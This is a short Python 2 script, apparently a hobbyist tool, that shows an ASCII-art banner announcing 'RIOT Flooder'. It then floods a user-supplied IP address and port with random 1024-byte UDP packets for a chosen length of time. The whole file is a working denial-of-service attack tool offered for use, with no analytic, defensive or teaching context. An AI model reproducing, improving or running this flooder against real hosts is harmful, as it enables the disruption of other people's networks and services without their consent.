# -*- coding: utf-8 -*-
import os
import sys
import time
import socket
import random

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

bytes = random._urandom(1024)

os.system(" ")
print(" .S_sSSs     .S    sSSs_sSSs    sdSS_SSSSSSbs  ")
print(".SS~YS%%b   .SS   d%%SP~YS%%b   YSSS~S%SSSSSP  ")
print("S%S   `S%b  S%S  d%S'     `S%b       S%S       ")
print("S%S    S%S  S%S  S%S       S%S       S%S       ")
print("S%S    d*S  S&S  S&S       S&S       S&S       ")
print("S&S   .S*S  S&S  S&S       S&S       S&S       ")
print("S&S_sdSSS   S&S  S&S       S&S       S&S       ")
print("S&S~YSY%b   S&S  S&S       S&S       S&S       ")
print("S*S   `S%b  S*S  S*b       d*S       S*S       ")
print("S*S    S%S  S*S  S*S.     .S*S       S*S       ")
print("S*S    S&S  S*S   SSSbs_sdSSS        S*S       ")
print("S*S    SSS  S*S    YSSP~YSSY         S*S       ")
print("SP          SP                       SP        ")
print("Y           Y                        Y         ")
print("Welcome To RIOT Flooder")
ip = raw_input("Target's IP: ")
port = input("Port: ")
dur = input("Time: ")
timeout = time.time() + dur
sent = 0

while True:
	try:
		if time.time() > timeout:
			break
		else:
			pass
		sock.sendto(bytes,(ip, port))
		sent = sent + 1
		print "Sent %s packets to %s through port %s"%(sent, ip, port)
	except KeyboardInterrupt:
		sys.exit()
